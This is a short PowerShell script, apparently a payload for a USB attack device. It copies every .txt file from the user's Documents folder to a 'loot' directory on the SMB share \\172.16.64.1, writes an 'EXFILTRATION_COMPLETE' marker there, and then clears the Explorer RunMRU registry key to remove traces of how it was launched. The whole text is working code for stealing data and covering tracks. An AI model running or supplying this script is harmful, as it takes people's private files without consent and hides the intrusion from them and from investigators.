$exfil_dir="$Env:UserProfile\Documents"
$exfil_ext="*.txt"
$loot_dir="\\172.16.64.1\s\e\$Env:ComputerName\$((Get-Date).ToString('yyyy-MM-dd_hhmmtt'))"
mkdir $loot_dir
robocopy $exfil_dir $loot_dir $exfil_ext /MT /Z
New-Item -Path FileSystem::\\172.16.64.1\s -Name "EXFILTRATION_COMPLETE" -Value "EXFILTRATION_COMPLETE"
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
